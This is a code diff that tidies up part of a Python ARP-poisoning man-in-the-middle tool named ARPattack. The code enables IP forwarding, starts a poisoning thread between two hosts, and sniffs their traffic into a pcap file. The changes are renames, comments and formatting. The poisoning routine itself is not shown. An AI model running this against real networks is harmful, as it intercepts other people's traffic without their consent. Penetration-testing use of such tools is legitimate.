@@ -8,7 +8,6 @@ import netifaces as ni
 class ARPattack:
 
     loop_bool = None
-    stop_sniff = False
 
     def __init__(self, ip1, mac1, ip2, mac2, frequency, packet_count):
         #ARP Poison parameters
@@ -22,19 +21,21 @@ class ARPattack:
 
     def start_attack(ip1, mac1, ip2, mac2, frequency, pkt_cnt, bool_sniff):
         # Check the interface first
-        ret = []
+        list_interfaces = []
         try:
-            f = open("/proc/net/if_inet6","r")
+            f = open("/proc/net/if_inet6", "r")
         except IOError and err:
-            return ret
+            return list_interfaces
         l = f.readlines()
         for i in l:
             # address, index, plen, scope, flags, ifname
-            tmp = i.split()
-            ret.append(str(tmp[5]))
-        for interface in ret:
+            temp = i.split()
+            list_interfaces.append(str(temp[5]))
+        for interface in list_interfaces:
             ip_if = ni.ifaddresses(interface)[AF_INET][0]["addr"]
+            # Check if the IP of the interface matches the input IP
             if ARP(pdst=ip_if+"/24") == ARP(pdst=ip1+"/24"):
+                # If so, use this interface to communicate through
                 conf.iface = interface
                 break
 
@@ -42,8 +43,8 @@ class ARPattack:
         conf.verb = 0
         print("> ARP: Enabling IP forwarding")
         os.system("sysctl -w net.ipv4.ip_forward=1")
-        print("> ARP: IP address 1: %s" %ip1)
-        print("> ARP: IP address 2: %s" %ip2)
+        print("> ARP: IP address 1: %s" % ip1)
+        print("> ARP: IP address 2: %s" % ip2)
 
         # ARP poisoning thread
         ARPattack.poison_thread = threading.Thread(target=ARPattack.arp_poison, args=(ip1, mac1, ip2, mac2,  frequency))
@@ -52,7 +53,8 @@ class ARPattack:
         # Sniff traffic and write to a .pcap file
         if bool_sniff:
             sniff_filter = "ip dst %s or ip dst %s " %(ip1, ip2)
-            print("> ARP: Sniffing active. Starting network capture. Packet Count: %d. Filter: %s" %(int(pkt_cnt), sniff_filter))
+            print("> ARP: Sniffing active. Starting network capture. Packet Count: %d. Filter: %s" % (int(pkt_cnt),
+                                                                                                     sniff_filter))
             packets = sniff(filter=sniff_filter, iface=conf.iface, count=int(pkt_cnt))
             wrpcap(ip2 + "_capturelog.pcap", packets)
 
